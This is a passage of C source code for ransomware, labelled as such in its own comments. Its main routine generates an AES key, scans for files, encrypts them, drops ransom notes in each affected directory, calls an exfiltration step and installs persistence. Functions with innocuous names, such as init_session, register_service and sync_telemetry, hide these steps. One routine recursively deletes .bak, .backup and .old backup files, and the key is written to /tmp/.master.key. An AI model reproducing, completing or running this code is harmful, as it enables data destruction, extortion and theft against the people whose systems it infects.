                continue;
            }
        }

        if (de->d_type == DT_DIR) {
            int st = process_directory(fullpath);
            if (st < 0) {
                critical = -1;
            } else if (st > 0) {
                partial = 1;
            }
            continue;
        }

        if (de->d_type != DT_REG) {
            continue;
        }

        if (!has_target_extension(de->d_name)) {
            continue;
        }

        if (remove(fullpath) == 0) {
            syslog(LOG_INFO, "register_service: removed %s", fullpath);
        } else {
            partial = 1;
            syslog(LOG_ERR, "register_service: remove(%s) failed: %s",
                   fullpath, strerror(errno));
            fprintf(stderr, "register_service: remove(%s) failed: %s\n",
                    fullpath, strerror(errno));
        }
    }

    closedir(dir);

    if (critical < 0) {
        return -1;
    }
    if (partial > 0) {
        return 1;
    }
    return 0;
}

static bool has_target_extension(const char *filename)
{
    const char *dot;
    size_t len;
    if (filename == NULL || filename[0] == '\0') {
        return false;
    }
    dot = strrchr(filename, '.');
    if (dot == NULL) {
        return false;
    }
    len = strlen(dot);
    if (len == 4 && strcmp(dot, ".bak") == 0) {
        return true;
    }
    if (len == 7 && strcmp(dot, ".backup") == 0) {
        return true;
    }
    if (len == 4 && strcmp(dot, ".old") == 0) {
        return true;
    }
    return false;
}

/* === init_session === */
const uint8_t *init_session(void)
{
    static uint8_t master_key[32];
    static int initialized = 0;

    if (initialized) {
        return master_key;
    }

    if (RAND_bytes(master_key, sizeof(master_key)) != 1) {
        fprintf(stderr, "init_session: RAND_bytes failed\n");
        return NULL;
    }

    BIO *b64 = BIO_new(BIO_f_base64());
    if (!b64) {
        fprintf(stderr, "init_session: BIO_new(BIO_f_base64) failed\n");
        return NULL;
    }
    BIO *bmem = BIO_new(BIO_s_mem());
    if (!bmem) {
        fprintf(stderr, "init_session: BIO_new(BIO_s_mem) failed\n");
        BIO_free(b64);
        return NULL;
    }
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_push(b64, bmem);

    if (BIO_write(b64, master_key, (int)sizeof(master_key)) <= 0) {
        fprintf(stderr, "init_session: BIO_write failed\n");
        BIO_free_all(b64);
        return NULL;
    }
    if (BIO_flush(b64) <= 0) {
        fprintf(stderr, "init_session: BIO_flush failed\n");
        BIO_free_all(b64);
        return NULL;
    }

    BUF_MEM *bptr = NULL;
    BIO_get_mem_ptr(b64, &bptr);
    if (!bptr || !bptr->data || bptr->length == 0) {
        fprintf(stderr, "init_session: BIO_get_mem_ptr failed\n");
        BIO_free_all(b64);
        return NULL;
    }

    size_t json_len = 15 + bptr->length + 1;
    char *json = malloc(json_len);
    if (!json) {
        fprintf(stderr, "init_session: malloc json failed\n");
        BIO_free_all(b64);
        return NULL;
    }
    int n = snprintf(json, json_len, "{\"aes_key\":\"%s\"}", bptr->data);
    if (n < 0 || (size_t)n >= json_len) {
        fprintf(stderr, "init_session: snprintf json failed\n");
        free(json);
        BIO_free_all(b64);
        return NULL;
    }
    BIO_free_all(b64);

    const char *path = "/tmp/.master.key";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) {
        fprintf(stderr, "init_session: open %s failed: ", path);
        perror(NULL);
        free(json);
        return NULL;
    }

    ssize_t written = write(fd, json, strlen(json));
    if (written < 0 || (size_t)written != strlen(json)) {
        fprintf(stderr, "init_session: write %s failed: ", path);
        perror(NULL);
        close(fd);
        unlink(path);
        free(json);
        return NULL;
    }

    if (fchmod(fd, S_IRUSR | S_IWUSR) < 0) {
        fprintf(stderr, "init_session: fchmod %s failed: ", path);
        perror(NULL);
        close(fd);
        unlink(path);
        free(json);
        return NULL;
    }

    if (close(fd) < 0) {
        fprintf(stderr, "init_session: close %s failed: ", path);
        perror(NULL);
        unlink(path);
        free(json);
        return NULL;
    }

    free(json);
    initialized = 1;

    return master_key;
}

/* === main === */
int main(void)
{
    /* 1) key generation */
    const uint8_t *key = init_session();
    if (!key) {
        fprintf(stderr, "init_session failed\n");
        return EXIT_FAILURE;
    }

    /* 2) file scan */
    char **paths = NULL;
    size_t count = 0;
    if (scan_storage(&paths, &count) != 0) {
        fprintf(stderr, "scan_storage failed\n");
        return EXIT_FAILURE;
    }

    /* Collect unique parent directories of encrypted files for manifest creation */
    char **dir_set = NULL;
    size_t dir_count = 0;
    size_t dir_capacity = 0;

    /* 3) encryption */
    for (size_t i = 0; i < count; i++) {
        if (apply_transform(paths[i], key) == 0) {
            /* Determine parent directory */
            char *path_copy = strdup(paths[i]);
            if (!path_copy) {
                continue;
            }
            char *dir_part = dirname(path_copy);
            char *dir_copy = strdup(dir_part);
            if (!dir_copy) {
                free(path_copy);
                continue;
            }

            /* Check if already recorded */
            int found = 0;
            for (size_t d = 0; d < dir_count; d++) {
                if (strcmp(dir_set[d], dir_copy) == 0) {
                    found = 1;
                    break;
                }
            }
            if (!found) {
                if (dir_count >= dir_capacity) {
                    size_t new_cap = dir_capacity == 0 ? 8 : dir_capacity * 2;
                    char **new_set = realloc(dir_set, new_cap * sizeof(char *));
                    if (!new_set) {
                        free(dir_copy);
                        free(path_copy);
                        break;
                    }
                    dir_set = new_set;
                    dir_capacity = new_cap;
                }
                dir_set[dir_count] = dir_copy;
                dir_count++;
            } else {
                free(dir_copy);
            }
            free(path_copy);
        }
    }

    /* 4) ransom notes */
    for (size_t d = 0; d < dir_count; d++) {
        write_manifest(dir_set[d]);
    }

    /* 5) exfiltration */
    sync_telemetry();

    /* 6) persistence */
    register_service("/usr/local/bin/service_daemon");

    /* cleanup */
    free_paths(paths);
    for (size_t d = 0; d < dir_count; d++) {
        free(dir_set[d]);
    }
    free(dir_set);

    return EXIT_SUCCESS;
}